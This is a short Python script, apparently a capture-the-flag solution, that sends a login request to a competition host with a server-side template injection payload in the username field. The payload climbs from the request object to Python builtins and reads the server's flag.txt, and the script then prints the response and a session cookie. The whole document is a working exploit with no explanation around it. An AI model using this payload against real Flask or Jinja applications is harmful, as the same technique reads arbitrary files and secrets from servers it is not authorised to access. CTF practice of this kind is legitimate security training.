from requests import post

with post(
    "http://ssssteal.ictf5.ninja/login",
    data={
        "username": """asd\n{{ request.__class__._load_form_data.__globals__.__builtins__.open("./flag.txt").read() }}\nasd""",
        "password": "123",
    },
) as req:
    print(req.text)
    print(req.history[0].cookies)
